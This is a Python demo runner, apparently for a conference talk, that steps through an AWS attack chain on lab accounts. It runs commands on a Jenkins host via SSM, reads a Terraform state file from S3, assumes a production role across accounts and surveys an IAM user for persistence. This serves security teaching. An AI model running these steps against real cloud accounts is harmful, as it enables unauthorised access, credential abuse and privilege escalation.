#!/usr/bin/env python3
import json
import os
import subprocess
import sys
import time
import shlex
import re

# Colores ANSI: funcionan bien en Git Bash / Windows Terminal.
# Si necesitas desactivarlos: NO_COLOR=1 python demo_runner.py
USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")


class C:
    RESET = "\033[0m" if USE_COLOR else ""
    BOLD = "\033[1m" if USE_COLOR else ""
    DIM = "\033[2m" if USE_COLOR else ""
    RED = "\033[91m" if USE_COLOR else ""
    GREEN = "\033[92m" if USE_COLOR else ""
    YELLOW = "\033[93m" if USE_COLOR else ""
    BLUE = "\033[94m" if USE_COLOR else ""
    MAGENTA = "\033[95m" if USE_COLOR else ""
    CYAN = "\033[96m" if USE_COLOR else ""
    WHITE = "\033[97m" if USE_COLOR else ""
    ORANGE = "\033[38;5;208m" if USE_COLOR else ""
    PURPLE = "\033[38;5;141m" if USE_COLOR else ""


def print_command(cmd):
    print(f"\n{C.CYAN}${C.RESET} {C.BOLD}{C.CYAN}{sanitize(shlex.join(cmd))}{C.RESET}")


def print_error(message):
    print(f"{C.RED}{C.BOLD}[ERROR]{C.RESET} {C.RED}{message}{C.RESET}", file=sys.stderr)


def print_warn(message):
    print(f"{C.YELLOW}{C.BOLD}[WARN]{C.RESET} {C.YELLOW}{message}{C.RESET}")


def print_ok(message):
    print(f"{C.GREEN}{C.BOLD}[OK]{C.RESET} {C.GREEN}{message}{C.RESET}")


REGION = "us-east-1"
ACCOUNT_A = os.environ.get("LAB_ACCOUNT_A_ID", "")
ACCOUNT_B = os.environ.get("LAB_ACCOUNT_B_ID", "")

if not all(re.fullmatch(r"[0-9]{12}", account) for account in (ACCOUNT_A, ACCOUNT_B)):
    print_error("Configura LAB_ACCOUNT_A_ID y LAB_ACCOUNT_B_ID con IDs de cuenta de 12 dígitos.")
    sys.exit(1)


def sanitize(value):
    """Oculta IDs reales de cuenta solo en lo que se muestra en pantalla."""
    if value is None:
        return value
    return (
        str(value)
        .replace(ACCOUNT_A, "ACCOUNT_A")
        .replace(ACCOUNT_B, "ACCOUNT_B")
    )

TFSTATE_BUCKET = f"orgsec-tfstate-{ACCOUNT_A}-us-east-1"
TFSTATE_KEY = "account-factory/terraform.tfstate"
PROD_ROLE_ARN = f"arn:aws:iam::{ACCOUNT_B}:role/ProdDeployRole"

env = os.environ.copy()
env["AWS_PAGER"] = ""

jenkins_instance_id = None


def run(cmd, capture=False, check=False):
    """
    Ejecuta el comando capturando SIEMPRE stdout/stderr para poder sanitizar
    cualquier Account ID antes de mostrarlo en pantalla.
    El argumento capture se conserva por compatibilidad, pero la salida visible
    siempre pasa por sanitize().
    """
    print_command(cmd)
    try:
        p = subprocess.run(
            cmd,
            env=env,
            text=True,
            capture_output=True,
            check=check
        )

        if p.stdout:
            print(sanitize(p.stdout.rstrip()))

        if p.stderr:
            print(sanitize(p.stderr.rstrip()), file=sys.stderr)

        return p

    except FileNotFoundError:
        print_error("No encuentro AWS CLI en PATH.")
        sys.exit(1)


def aws(*args, capture=False, check=False):
    return run(["aws", *args], capture=capture, check=check)


def wait_for_step(number, title):
    while True:
        prompt = (
            f"\n{C.WHITE}¿Continuar con el siguiente paso? "
            f"{C.GREEN}{C.BOLD}[y]{C.RESET}{C.WHITE} sí  "
            f"{C.YELLOW}{C.BOLD}[n]{C.RESET}{C.WHITE} saltar  "
            f"{C.RED}{C.BOLD}[q]{C.RESET}{C.WHITE} salir: {C.RESET}"
        )
        ans = input(prompt).strip().lower()

        if ans == "y":
            # Revelar el siguiente salto solo después de la confirmación.
            line = "═" * 72
            print(f"\n{C.PURPLE}{line}{C.RESET}")
            print(
                f"{C.ORANGE}{C.BOLD}PASO {number}{C.RESET}"
                f"{C.WHITE}{C.BOLD}  ·  {title}{C.RESET}"
            )
            print(f"{C.PURPLE}{line}{C.RESET}")
            return True

        if ans == "n":
            print(f"{C.YELLOW}Paso omitido.{C.RESET}")
            return False

        if ans == "q":
            print(f"{C.MAGENTA}Demo detenida.{C.RESET}")
            sys.exit(0)


def resolve_jenkins():
    global jenkins_instance_id

    if jenkins_instance_id:
        return jenkins_instance_id

    p = subprocess.run(
        [
            "aws", "ec2", "describe-instances",
            "--region", REGION,
            "--filters",
            "Name=tag:Application,Values=Jenkins",
            "Name=instance-state-name,Values=running",
            "--query", "Reservations[].Instances[].InstanceId",
            "--output", "text",
        ],
        env=env,
        text=True,
        capture_output=True
    )

    value = p.stdout.strip().split()

    if not value:
        print_error("No pude resolver automáticamente la EC2 Jenkins.")
        print(f"{C.RED}Revisa que tenga el tag Application=Jenkins.{C.RESET}")
        sys.exit(1)

    jenkins_instance_id = value[0]
    print(f"{C.PURPLE}{C.BOLD}[demo]{C.RESET} Jenkins detectado: {C.CYAN}{C.BOLD}{jenkins_instance_id}{C.RESET}")
    return jenkins_instance_id


def ssm_run(commands):
    instance_id = resolve_jenkins()

    params = json.dumps({"commands": commands})

    cmd = [
        "aws", "ssm", "send-command",
        "--instance-ids", instance_id,
        "--document-name", "AWS-RunShellScript",
        "--parameters", params,
        "--region", REGION,
        "--query", "Command.CommandId",
        "--output", "text",
    ]

    print_command(cmd)

    p = subprocess.run(
        cmd,
        env=env,
        text=True,
        capture_output=True
    )

    if p.returncode != 0:
        print_error(sanitize(p.stderr.rstrip()))
        return

    command_id = p.stdout.strip()
    print(f"{C.MAGENTA}CommandId:{C.RESET} {C.BOLD}{command_id}{C.RESET}")

    # Espera corta hasta que termine.
    for _ in range(30):
        q = subprocess.run(
            [
                "aws", "ssm", "get-command-invocation",
                "--command-id", command_id,
                "--instance-id", instance_id,
                "--region", REGION,
                "--output", "json",
            ],
            env=env,
            text=True,
            capture_output=True
        )

        if q.returncode == 0:
            try:
                data = json.loads(q.stdout)
                status = data.get("Status")
                if status in {"Success", "Failed", "Cancelled", "TimedOut"}:
                    out = data.get("StandardOutputContent", "").rstrip()
                    err = data.get("StandardErrorContent", "").rstrip()

                    status_color = C.GREEN if status == "Success" else C.RED
                    print(
                        f"{C.WHITE}Status:{C.RESET} "
                        f"{status_color}{C.BOLD}{status}{C.RESET}"
                    )
                    if out:
                        print(f"\n{C.CYAN}{C.BOLD}OUTPUT{C.RESET}")
                        print(f"{C.WHITE}{sanitize(out)}{C.RESET}")
                    if err:
                        print(f"\n{C.RED}{C.BOLD}STDERR{C.RESET}")
                        print(f"{C.RED}{sanitize(err)}{C.RESET}")
                    return data
            except json.JSONDecodeError:
                pass

        time.sleep(1)

    print_warn("El comando sigue ejecutándose o no pude recuperar el resultado.")


steps = [
    (
        "Validar identidad actual",
        lambda: aws("sts", "get-caller-identity")
    ),
    (
        "IAM introspection: comprobar que no puedo leer la policy del role",
        lambda: aws(
            "iam", "list-attached-role-policies",
            "--role-name", "CloudOpsInventoryRole"
        )
    ),
    (
        "Discovery EC2",
        lambda: aws(
            "ec2", "describe-instances",
            "--region", REGION,
            "--query",
            "Reservations[].Instances[].{InstanceId:InstanceId,PrivateIp:PrivateIpAddress,PublicIp:PublicIpAddress,Role:IamInstanceProfile.Arn,Tags:Tags}",
            "--output", "json"
        )
    ),
    (
        "Discovery de managed nodes con Systems Manager",
        lambda: aws(
            "ssm", "describe-instance-information",
            "--region", REGION,
            "--output", "json"
        )
    ),
    (
        "Validación inocua de Run Command sobre Jenkins",
        lambda: ssm_run(["hostname", "uname -a"])
    ),
    (
        "Ver la identidad AWS que hereda Jenkins",
        lambda: ssm_run(["aws sts get-caller-identity"])
    ),
    (
        "Enumerar buckets usando endpoint us-east-2 (visibilidad regional)",
        lambda: (
            print(
                f"{C.DIM}Nota: esto no evade CloudTrail; sirve para mostrar que "
                f"Event History se consulta por región y una revisión manual puede mirar "
                f"solo la región esperada.{C.RESET}"
            ),
            ssm_run([
                "aws s3api list-buckets --region us-east-2 --output json"
            ])
        )[-1]
    ),
    (
        "Enumerar objetos del bucket de tfstate",
        lambda: ssm_run([
            f"aws s3api list-objects-v2 --bucket {TFSTATE_BUCKET} --region {REGION} --output json"
        ])
    ),
    (
        "Leer el tfstate sintético",
        lambda: ssm_run([
            f"aws s3api get-object --bucket {TFSTATE_BUCKET} "
            f"--key {TFSTATE_KEY} /tmp/terraform.tfstate "
            f"--region {REGION} >/dev/null && cat /tmp/terraform.tfstate"
        ])
    ),
    (
        "Validar el salto cross-account a ProdDeployRole",
        lambda: ssm_run([
            f'CREDS=$(aws sts assume-role --role-arn {PROD_ROLE_ARN} '
            f'--role-session-name jenkins-prod-check '
            f'--query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" --output text)',
            'set -- $CREDS',
            'AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3" '
            f'aws sts get-caller-identity --region {REGION}'
        ])
    ),
    (
        "Comprobar permisos de ProdDeployRole",
        lambda: ssm_run([
            f'CREDS=$(aws sts assume-role --role-arn {PROD_ROLE_ARN} '
            f'--role-session-name jenkins-prod-check '
            f'--query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" --output text)',
            'set -- $CREDS',
            'export AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3"',
            'aws iam list-attached-role-policies --role-name ProdDeployRole --output json',
            'aws iam list-role-policies --role-name ProdDeployRole --output json'
        ])
    ),
    (
        "Descubrir usuarios en PROD",
        lambda: ssm_run([
            f'CREDS=$(aws sts assume-role --role-arn {PROD_ROLE_ARN} '
            f'--role-session-name jenkins-prod-check '
            f'--query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" --output text)',
            'set -- $CREDS',
            'export AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3"',
            'aws iam list-users --output json'
        ])
    ),
    (
        "Revisar OperationsRecoveryUser antes de persistencia",
        lambda: ssm_run([
            f'CREDS=$(aws sts assume-role --role-arn {PROD_ROLE_ARN} '
            f'--role-session-name jenkins-prod-check '
            f'--query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" --output text)',
            'set -- $CREDS',
            'export AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3"',
            'echo "=== ATTACHED POLICIES ==="',
            'aws iam list-attached-user-policies --user-name OperationsRecoveryUser --output json',
            'echo "=== INLINE POLICIES ==="',
            'aws iam list-user-policies --user-name OperationsRecoveryUser --output json',
            'echo "=== ACCESS KEYS ==="',
            'aws iam list-access-keys --user-name OperationsRecoveryUser --output json'
        ])
    ),
]


def main():
    print(
        f"\n{C.ORANGE}{C.BOLD}AWS COMMUNITY DAY · DEMO RUNNER{C.RESET}\n"
        f"{C.PURPLE}{'━' * 72}{C.RESET}\n"
        f"{C.WHITE}Cada {C.GREEN}{C.BOLD}y{C.RESET}{C.WHITE} ejecuta únicamente el siguiente paso.\n"
        f"Las credenciales AWS deben estar cargadas antes de iniciar este script.{C.RESET}\n\n"
        f"{C.DIM}Controles:  "
        f"{C.GREEN}y = ejecutar{C.RESET}{C.DIM}  ·  "
        f"{C.YELLOW}n = saltar{C.RESET}{C.DIM}  ·  "
        f"{C.RED}q = salir{C.RESET}\n"
    )

    # Verificación rápida, sin imprimir secretos.
    required = [
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN"
    ]
    missing = [x for x in required if not os.environ.get(x)]
    if missing:
        print_warn("No detecto todas las variables AWS temporales:")
        print(f"{C.YELLOW}       {', '.join(missing)}{C.RESET}")
        print(f"{C.YELLOW}       Carga primero las credenciales del lab.{C.RESET}\n")

    for i, (title, fn) in enumerate(steps, start=1):
        if wait_for_step(i, title):
            try:
                fn()
            except KeyboardInterrupt:
                print(f"\n{C.YELLOW}Paso interrumpido.{C.RESET}")
            except Exception as e:
                print_error(sanitize(str(e)))

    print(f"\n{C.GREEN}{C.BOLD}✓ Fin de la secuencia preparada.{C.RESET}")
    print(
        f"{C.DIM}La creación de la access key de persistencia no está automatizada aquí\n"
        f"para evitar que una credencial aparezca accidentalmente en pantalla.{C.RESET}"
    )


if __name__ == "__main__":
    main()
